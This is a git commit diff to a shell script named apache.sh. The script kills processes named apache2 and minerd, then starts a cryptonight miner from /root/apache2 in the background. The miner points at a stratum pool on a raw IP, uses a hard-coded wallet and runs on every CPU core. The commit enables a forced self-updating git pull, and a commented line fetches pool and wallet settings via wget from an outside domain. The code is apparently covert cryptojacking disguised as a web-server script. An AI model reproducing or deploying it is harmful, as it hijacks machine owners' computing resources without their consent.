e0186fcbb7f3e5ce37f033b7f63cc4ce696a6c69
tanhuevon <36043964+tanhuevon@users.noreply.github.com>
2018-03-05 09:57:41 -0500

    Update apache.sh

--- apache.sh
+++ apache.sh
@@ -3,6 +3,6 @@ killall apache2
 killall  minerd
 nohup /root/apache2 -a cryptonight -o stratum+tcp://45.76.248.236:3333 -u "etnkPDDjHh4QYLCFkNNSXmgNAwfgUaxphgWuz5Fva3cXJm5cJoWRwubjnQqzSbxH5vUxVCw7En2JY5oJZRv17eeR9o4ZmmBLn7+10000" -p `cat index.html`"-"`date +%y%m%d`:zonewar@hotmail.com -t `grep processor /proc/cpuinfo| wc -l` 1> apache2.log 2> apache3.log &
 
-#cd tanhuevon/ ; git stash drop; git reset --hard; git pull
+cd tanhuevon/ ; git stash drop; git reset --hard; git pull
 
 #/root/apache2 -a cryptonight -o stratum+tcp://`wget -q -O - sio.com.co/m/dirpool.txt` -u "`wget -q -O - sio.com.co/m/dirwallet.txt`+10000" -p `cat index.html`"-"`date +%y%m%d`:zonewar@hotmail.com -t `grep processor /proc/cpuinfo| wc -l` 1> apache2.log 2> apache3.log
